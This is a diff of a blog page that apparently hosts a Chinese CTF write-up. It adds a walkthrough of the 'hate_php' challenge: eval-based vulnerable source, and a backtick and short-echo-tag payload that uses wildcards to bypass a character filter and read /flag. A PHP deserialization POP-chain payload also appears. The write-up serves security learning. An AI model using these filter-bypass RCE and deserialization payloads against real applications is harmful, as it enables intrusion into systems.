@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/i/034DsUU1jYJNy1weAUVkLK.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/i/034DsU1jU5ApKphr2PNzs6.png">
 <meta property="article:published_time" content="2022-04-14T05:18:00.000Z">
-<meta property="article:modified_time" content="2026-08-26T14:07:50.538Z">
+<meta property="article:modified_time" content="2026-08-26T14:41:06.598Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -150,7 +150,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第五空间智能安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pklovecloud%EF%BC%88POP-%E9%93%BE%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">pklovecloud（POP 链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hate-php"><span class="toc-number">1.1.2.</span> <span class="toc-text">hate_php</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第五空间智能安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pklovecloud%EF%BC%88POP-%E9%93%BE%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">pklovecloud（POP 链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hate-php%EF%BC%88%E5%8F%8D%E5%BC%95%E5%8F%B7-RCE-%E7%9F%AD-echo-%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">hate_php（反引号 RCE + 短 echo 标签绕过 + 通配符绕过）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -298,7 +298,28 @@
 <p>URL 编码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pks=O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>acp%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>cinder%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ace%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>openstack%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>docker%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>neutron%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nova%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
 
-<h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h3><p><img src="https://pic1.imgdb.cn/i/034DsUU1jYJNy1weAUVkLK.png" alt="pasted_1787752612159_qnktqp.png"></p>
+<h3 id="hate-php（反引号-RCE-短-echo-标签绕过-通配符绕过）"><a href="#hate-php（反引号-RCE-短-echo-标签绕过-通配符绕过）" class="headerlink" title="hate_php（反引号 RCE + 短 echo 标签绕过 + 通配符绕过）"></a>hate_php（反引号 RCE + 短 echo 标签绕过 + 通配符绕过）</h3><p><img src="https://pic1.imgdb.cn/i/034DsUU1jYJNy1weAUVkLK.png" alt="pasted_1787752612159_qnktqp.png"></p>
+<p>打开首页直接给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过 WAF，也就是不能出现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A-Z</span><br><span class="line">a-z</span><br><span class="line">0-9</span><br><span class="line">_</span><br><span class="line">$</span><br><span class="line">@</span><br></pre></td></tr></table></figure>
+
+<p>PHP 里反引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `id`;</span><br></pre></td></tr></table></figure>
+
+<p>等价于执行系统命令并输出结果，类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造 Payload 如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`command`<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>        <span class="comment">// 结束当前 PHP 代码块</span></span><br><span class="line"><span class="meta">&lt;?=</span>       <span class="comment">// PHP 短 echo 标签，相当于 &lt;?php echo</span></span><br><span class="line">`command` <span class="comment">// 执行 shell 命令</span></span><br><span class="line"><span class="meta">?&gt;</span>        <span class="comment">// 结束短标签</span></span><br></pre></td></tr></table></figure>
+
+<p>再配合通配符构造最终 Payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`/???/??? /????`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>等同于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `/bin/cat /flag`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://pic1.imgdb.cn/i/034DsU1jU5ApKphr2PNzs6.png" alt="pasted_1787752589004_ld9t7s.png"></p>
 
     </div>
@@ -311,19 +332,19 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="2022 HITCON WriteUp" class="lazyload">
-        <a href="/2022/04/14/2022%20HITCON/" aria-label="前一篇: 2022 HITCON WriteUp" title="前一篇: 2022 HITCON WriteUp"></a>
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="2021 第四届红帽杯网络安全大赛 WriteUp" class="lazyload">
+        <a href="/2022/04/14/2021-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" aria-label="前一篇: 2021 第四届红帽杯网络安全大赛 WriteUp" title="前一篇: 2021 第四届红帽杯网络安全大赛 WriteUp"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
-            2022 HITCON WriteUp
+            2021 第四届红帽杯网络安全大赛 WriteUp
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="b2evolution CMS SQL 注入（CVE-2021-28242）" class="lazyload">
-      <a href="/2021/05/26/b2evolution%20CMS%20SQL%20%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2021-28242%EF%BC%89/" aria-label="后一篇: b2evolution CMS SQL 注入（CVE-2021-28242）"  title="后一篇: b2evolution CMS SQL 注入（CVE-2021-28242）"></a>
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="2022 HITCON WriteUp" class="lazyload">
+      <a href="/2022/04/14/2022%20HITCON/" aria-label="后一篇: 2022 HITCON WriteUp"  title="后一篇: 2022 HITCON WriteUp"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
-          b2evolution CMS SQL 注入（CVE-2021-28242）
+          2022 HITCON WriteUp
       </h3>
     </div>
   </nav>
@@ -350,10 +371,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        289.4k
+        289.9k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        23:38
+        23:40
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -375,7 +396,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第五空间智能安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pklovecloud%EF%BC%88POP-%E9%93%BE%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">pklovecloud（POP 链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hate-php"><span class="toc-number">1.1.2.</span> <span class="toc-text">hate_php</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第五空间智能安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pklovecloud%EF%BC%88POP-%E9%93%BE%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">pklovecloud（POP 链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hate-php%EF%BC%88%E5%8F%8D%E5%BC%95%E5%8F%B7-RCE-%E7%9F%AD-echo-%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">hate_php（反引号 RCE + 短 echo 标签绕过 + 通配符绕过）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -509,7 +530,7 @@
           description: "",
           stripContent: "2021 第五空间智能安全大赛 WriteUp🏛️ 组织架构  主办单位：天津市委网信办、天津市总工会  承办单位：三六零集团（360政企安全集团）、天津滨海高新区总工会  协办单位：包括国家工业信息安全发展研究中心、南开大学网络空间安全学院、天津大学网络安全学院等多家机构   📅 赛程与赛制  报名时间：2021 年 8 月 27 日至 9 月 12 日  线上初赛：2021 年 9 月 16 日举行，采用 CTF（解题）模式  线下决赛：2021 年 10 月 10 日在天津举行，采用 ",
           date: "Thu Apr 14 2022 13:18:00 GMT+0800",
-          updated: "Wed Aug 26 2026 22:07:50 GMT+0800",
+          updated: "Wed Aug 26 2026 22:41:06 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
